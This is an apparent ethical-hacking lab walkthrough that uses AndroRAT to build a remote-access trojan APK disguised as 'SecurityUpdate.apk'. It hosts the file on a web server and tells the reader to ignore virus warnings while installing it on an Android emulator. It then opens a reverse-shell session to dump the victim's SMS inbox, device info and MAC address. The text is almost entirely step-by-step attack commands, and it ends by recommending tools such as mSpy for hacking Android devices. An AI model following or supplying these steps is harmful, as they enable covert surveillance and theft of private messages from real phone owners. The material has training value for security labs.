
In the Parrot Security machine, open a Terminal window and execute sudo su to run the programs as a root user (When prompted, enter the password toor).

Run cd AndroRAT command to navigate to the AndroRAT repository.

Run python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).

You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/.

Run cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk file to the location share folder.
 If the share folder does not exist, then execute the following commands to create a share folder and assign required permissions to it:
Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share command

Execute service apache2 start command to start an Apache web server.

Now, run python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to the victim's machine.
--shell: is used for getting the interpreter
-i: specifies the IP address for listening (here, 0.0.0.0)
 -p: specifies the port number (here, 4444)

You can observe that AndroRAT starts waiting for a connection.
switch to the Android emulator machine.

If the Android machine is non-responsive then, click the Commands icon from the top section of the screen and navigate to Power and Display --> Reset/Reboot machine.

In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser

In the address bar, type http://10.10.1.13/share and press Enter.

The Index of /share page appears; click SecurityUpdate.apk to download the application package file.

If Chrome needs storage access to download files, a pop-up appears; click Continue. If any pop-up appears stating that the file contains a virus, ignore the message and download the file anyway.

If File can't be downloaded securely pop-up appears click Keep.

After the file downloads, File downloaded pop-up appears, click Open.

Google Service Framework window appears, click INSTALL button to install the malicious app.

 After the application is installed successfully, an App installed notification appears; click OPEN.

The malicious application starts running in the background without the victim being totally unaware of it.

switch back to the Parrot Security machine. The Interpreter session has been opened successfully, with a connection from the victim machine (10.10.1.14), as shown in the screenshot.

In the Interpreter session, type help and press Enter to view the available commands in the opened session.

Now, type deviceInfo and press Enter to view the device related information.

Type getSMS inbox and press Enter to obtain a file containing SMSes from the inbox of a victim device.

This file is stored at the location /home/attacker/AndroRAT/Dumps.

Type getMACAddress and press Enter to view the MAC address of the victim's device.

In a similar manner, you can attempt to execute additional commands available in the list of help commands to gather more information on the target device.

Type exit and press Enter to terminate the Interpreter session.


Use other Android hacking tools such as hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com), and Hackingtoolkit (https://github.com) to hack Android devices.